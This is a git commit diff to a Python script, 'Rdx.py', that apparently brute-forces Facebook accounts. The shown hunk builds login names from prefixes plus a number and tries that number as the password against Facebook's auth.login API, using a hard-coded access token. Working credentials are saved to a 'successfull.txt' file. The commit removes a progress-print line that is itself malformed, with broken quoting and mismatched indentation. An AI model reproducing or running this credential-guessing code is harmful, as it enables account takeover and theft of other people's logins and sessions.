20bc87d6b55e812583fb1d856d87a96b14163d2b
Rdx <132105892+Rdx-76@users.noreply.github.com>
2023-05-10 20:30:47 +0600

    Add files via upload

--- Rdx.py
+++ Rdx.py
@@ -14616,8 +14616,6 @@ def action():
 			pass1 = user
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
-        print '\033[1;97m(' %s[ⓇDX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
 			if 'access_token' in q:
 				print '\x1b[1;92m[ⓇDX-OK]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
